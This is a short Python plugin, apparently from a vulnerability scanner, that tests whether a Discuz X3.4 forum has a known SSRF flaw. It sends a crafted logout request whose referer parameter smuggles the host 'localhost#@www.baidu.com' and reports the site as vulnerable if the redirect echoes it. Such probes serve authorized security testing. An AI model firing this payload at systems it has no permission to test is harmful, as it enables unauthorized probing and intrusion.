#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'

def info(data):
    info = {
        "name": "discuz x3.4 ssrf",
        "info": "discuz x3.4 ssrf",
        "level": "high",
        "type": "ssrf",
    }
    return info

def prove(data):
    init(data,'web')
    if data['base_url']:
        url = data[
                  'base_url'] + "code-src/dz/Discuz_TC_BIG5/upload/member.php?mod=logging&action=logout&XDEBUG_SESSION_START=13904&referer=http://localhost%23%40www.baidu.com&quickforward=1"
        res = curl('get', url)
        if res != None and "location".lower() in res.headers.keys() and 'http://localhost#@www.baidu.com' in res.headers['location']:
            data['flag'] = 1
            data['data'].append({"flag": url})
            data['res'].append({"info": url, "key": "discuz x3.4 ssrf"})
    return data
